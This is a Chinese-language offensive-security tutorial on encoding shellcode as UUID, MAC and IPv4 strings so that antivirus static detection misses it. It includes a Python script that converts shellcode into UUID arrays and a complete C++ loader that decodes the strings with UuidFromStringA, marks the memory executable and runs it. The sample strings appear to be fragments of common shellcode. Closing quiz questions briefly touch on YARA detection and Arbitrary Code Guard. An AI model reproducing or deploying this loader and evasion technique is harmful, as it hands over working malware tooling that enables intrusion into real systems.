## 🎯 作戰任務破題 (Tactical Objective & Mental Workflow)

## 🔬 第一動：系統原生轉換 API、RFC 標準格式與靜態特徵擦除物理機制 (Mechanics & String Encoding)

### 1. 各類字串封裝技術對比
- **UUID / GUID 編碼**：
  - RFC 4122 標準：UUID 長度固定為 16 個位元組（36 個 ASCII 字元，格式 `8-4-4-4-12`）。
  - 使用 Windows 原生 `Rpcrt4.dll` 的 `UuidFromStringA` 函數解碼，每個 UUID 字串可無損還原 16 位元組機器碼。
- **MAC 位址編碼**：
  - 每個 MAC 位址固定 6 個位元組（格式 `XX-XX-XX-XX-XX-XX`）。
  - 使用 `ntdll.dll` 中的 `RtlEthernetStringToAddressA` 解碼。
- **IPv4 / IPv6 編碼**：
  - IPv4 每組 4 位元組（`a.b.c.d`），利用 `RtlIpv4StringToAddressA` 解碼。

### 2. 對抗靜態分析引擎的本質
傳統加密（如 AES 或 RC4）往往會在二進位檔中引入高熵值資料區塊（Entropy > 7.0），直接被現代 AV 的啟發式演算法標記為可疑加殼程式。將二進位機器碼轉換為大批看似合法的「配置字串清單」，熵值通常降至 3.5~4.5（符合正常文字數據常態分佈），完全躲過靜態偵測雷達。

## ⚡ 第二動：戰術執行與工具鏈操作 (Attack Vectors & Exploitation)

### 1. Python 離線將 Shellcode 轉換為 UUID 陣列
```python
# sc_to_uuid.py
import uuid

def convert_to_uuid(shellcode_bytes):
    # 補齊 16 位元組倍數
    padding = len(shellcode_bytes) % 16
    if padding != 0:
        shellcode_bytes += b"\x90" * (16 - padding)
    
    uuids = []
    for i in range(0, len(shellcode_bytes), 16):
        chunk = shellcode_bytes[i:i+16]
        # 注意 Little-Endian 字節序轉換
        u = uuid.UUID(bytes_le=chunk)
        uuids.append(f'"{str(u)}"')
    return uuids
```

### 2. C/C++ 載入器利用 `UuidFromStringA` 記憶體還原執行
```cpp
#include <windows.h>
#include <rpc.h>
#pragma comment(lib, "Rpcrt4.lib")

const char* uuids[] = {
    "e48348fc-e8f0-00c8-0000-415141505251",
    "d2314856-4865-528b-6048-8b5218488b52"
    // 更多混淆 UUID...
};

void ExecuteUuidShellcode() {
    int numUuids = sizeof(uuids) / sizeof(uuids[0]);
    LPVOID pMemory = VirtualAlloc(NULL, numUuids * 16, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    DWORD_PTR current = (DWORD_PTR)pMemory;

    for (int i = 0; i < numUuids; i++) {
        // 利用微軟原生 RPC API 直接將 UUID 字串解析進目標記憶體
        UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)current);
        current += 16;
    }

    DWORD oldProtect;
    VirtualProtect(pMemory, numUuids * 16, PAGE_EXECUTE_READ, &oldProtect);
    ((void(*)())pMemory)();
}
```

## 🎯 作戰驗收檢查點 (Operational Checkpoints)

- [ ] **Q1：為什麼將 Shellcode 轉換為 UUID 或 MAC 字串能夠有效規避防毒軟體的靜態檢測？**
  - **戰術思維**：靜態查殺依賴二進位特徵碼與高熵值檢測；將機器碼編碼為 ASCII 字串使特徵碼物理上消失，且資訊熵大幅降低為普通文字級別。
- [ ] **Q2：使用 `UuidFromStringA` 解碼時，為什麼在轉換前必須特別注意字節序 (Endianness)？**
  - **戰術思維**：因為 Windows 的 GUID 結構體在前三段欄位中採用 Little-Endian（低位元在前）儲存，若未經 `bytes_le` 處理會導致機器碼順序顛倒。
- [ ] **Q3：除了 UUID 外，Windows 系統中還有哪些原生 API 經常用於字串型 Shellcode 還原？**
  - **戰術思維**：`ntdll.dll` 的 `RtlEthernetStringToAddressA` (MAC)、`RtlIpv4StringToAddressA` (IPv4) 以及 `RtlIpv6StringToAddressA`。
- [ ] **Q4：藍隊靜態 YARA 規則如何針對這類「字串還原載入器」進行特徵建模？**
  - **戰術思維**：結合檔案體積、導入表（同時導入 `Rpcrt4.dll` 的 `UuidFromStringA` 與記憶體分配函數如 `VirtualAlloc`）、以及檔案中包含密集 UUID 正則特徵進行關聯匹配。
- [ ] **Q5：若目標系統啟用了 ACG (Arbitrary Code Guard)，此類載入器執行會受到何種阻礙？**
  - **戰術思維**：ACG 阻斷任何進程將動態分配的記憶體賦予執行權限 (`PAGE_EXECUTE_READ`)，調用 `VirtualProtect` 提升權限時將直接觸發核心阻斷。
